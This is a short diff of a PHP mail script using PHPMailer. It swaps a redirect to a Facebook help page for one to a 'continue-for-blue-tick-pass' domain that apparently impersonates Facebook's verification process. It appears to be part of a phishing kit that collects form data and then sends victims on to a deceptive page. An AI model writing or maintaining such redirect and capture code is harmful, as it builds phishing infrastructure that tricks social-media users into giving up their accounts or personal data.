@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://www.facebook.com/help/media/thank-you?rdrhc");
+header("Location:https://continue-for-blue-tick-pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
